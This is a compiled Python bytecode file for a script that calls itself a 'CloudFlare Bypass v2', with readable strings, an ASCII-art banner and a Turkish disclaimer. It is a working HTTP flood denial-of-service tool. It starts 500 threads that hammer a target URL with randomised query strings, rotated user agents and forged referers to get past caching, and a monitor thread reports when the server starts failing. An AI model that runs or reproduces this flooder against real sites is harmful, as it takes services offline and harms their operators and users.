ó
pÍ`c           @   s  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d Z d Z g  a g  a d a	 d a
 d a d   Z d   Z d   Z d   Z d   Z d	   Z d
   Z d GHd GHd   Z d e j f d     YZ d e j f d     YZ e e j  d k  re   e j   nî e j d d k r:e   e j   nÇ d GHe e j  d k rte j d d k rte   qtn  e j d Z e j d  d k r£e d Z n  e j d e  Z e j d  Z x' e d  D] Z e   Z  e  j!   qÑWe   Z  e  j!   d S(   iÿÿÿÿNt    i    c           C   s   t  d 7a  d  S(   Ni   (   t   request_counter(    (    (    s   web2.pyt   inc_counter   s    c         C   s
   |  a  d  S(   N(   t   flag(   t   val(    (    s   web2.pyt   set_flag   s    c           C   s
   d a  d  S(   Ni   (   t   safe(    (    (    s   web2.pyt   set_safe   s    c           C   s    t  j d  t  j d  t  j d  t  j d  t  j d  t  j d  t  j d  t  j d  t  j d	  t  j d
  t  j d  t  j d  t  S(   NsR   Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3sj   Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)sm   Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)sX   Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1ss   Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1sm   Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)s   Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)sK   Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)sd   Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)s9   Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)s.   Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)s>   Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51(   t   headers_useragentst   append(    (    (    s   web2.pyt   useragent_list   s    c           C   s@   t  j d  t  j d  t  j d  t  j d t d  t  S(   Ns   http://www.google.com/?q=s)   http://www.usatoday.com/search/results?q=s(   http://engadget.search.aol.com/search?q=s   http://t   /(   t   headers_referersR	   t   host(    (    (    s   web2.pyt   referer_list.   s
    c         C   sF   d } x9 t  d |   D]( } t j d d  } | t |  7} q W| S(   NR    i    iA   iZ   (   t   ranget   randomt   randintt   chr(   t   sizet   out_strt   it   a(    (    s   web2.pyt
   buildblock7   s
    c           C   s   d GHd GHd GHd  S(   Ns3   ---------------------------------------------------sM   Mustafa Kemal ATATURK (*-*) Mert (*-*) [+]CloudFlare Bypass v2 Script web2.pys   (    (    (    (    s   web2.pyt   usage>   s    sT               .
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |   Cloud Flare   |  |  |     |         |      |
     |  |        By Pass! |  |  |/----|`---=    |      |
     |  |  root@mert~~    |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [v2]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"

Copyright: Guvenlik zaafiyetlerini denemek icin yazilmistir. Sorumluluk kabul edilmez...!

                  ;::::;  Mustafa Kemal Ataturk...                             
s3   ---------------------------------------------------c         C   s  t    t   d } |  j d  d k r2 d } n d } t j |  | t t j d d   d t t j d d    } | j d t j	 t
   | j d d	  | j d
 d  | j d t j	 t  t t j d d    | j d t j d d   | j d d  | j d t  y t j |  WnJ t j k
 r]} t d  d GHd } n4 t j k
 r|} t j   n Xt   t j |  | S(   Ni    t   ?t   &i   i
   t   =s
   User-Agents   Cache-Controls   no-caches   Accept-Charsets   ISO-8859-1,utf-8;q=0.7,*;q=0.7t   Refereri   s
   Keep-Alivein   ix   t
   Connections
   keep-alivet   Hosti   sM   Mustafa Kemal ATATURK (*-*) Mert (*-*) [+]CloudFlare Bypass v2 Script web2.py(   R
   R   t   countt   urllib2t   RequestR   R   R   t
   add_headert   choiceR   R   R   t   urlopent	   HTTPErrorR   t   URLErrort   syst   exitR   (   t   urlt   codet   param_joinert   requestt   e(    (    s   web2.pyt   httpcall^   s2    	C/
	t
   HTTPThreadc           B   s   e  Z d    Z RS(   c         C   s`   yF x? t  d k  rD t t  } | d k t d k @r t d  q q WWn t k
 r[ } n Xd  S(   Ni   iô  i   (   R   R.   R)   R   R   t	   Exception(   t   selfR*   t   ex(    (    s   web2.pyt   run   s    (   t   __name__t
   __module__R3   (    (    (    s   web2.pyR/      s   t   MonitorThreadc           B   s   e  Z d    Z RS(   c         C   s]   t  } x< t d k rD | d t  k  | t  k @r	 d t  GHt  } q	 q	 Wt d k rY d GHn  d  S(   Ni    id   s   %d Shots sends Sentingi   s   
 -M60 Hits are secced(   R   R   (   R1   t   previous(    (    s   web2.pyR3      s    	(   R4   R5   R3   (    (    (    s   web2.pyR6      s   i   i   t   helpsM   Mustafa Kemal ATATURK (*-*) Mert (*-*) [+]CloudFlare Bypass v2 Script web2.pyi   R   R   s   http\://([^/]*)/?.*iô  ("   R    R'   t	   threadingR   t   reR)   R   R   R   R   R   R   R   R   R   R
   R   R   R   R.   t   ThreadR/   R6   t   lent   argvR(   R   t   searcht   mt   groupR   R   t   tt   start(    (    (    s   web2.pyt   <module>   sV   									!		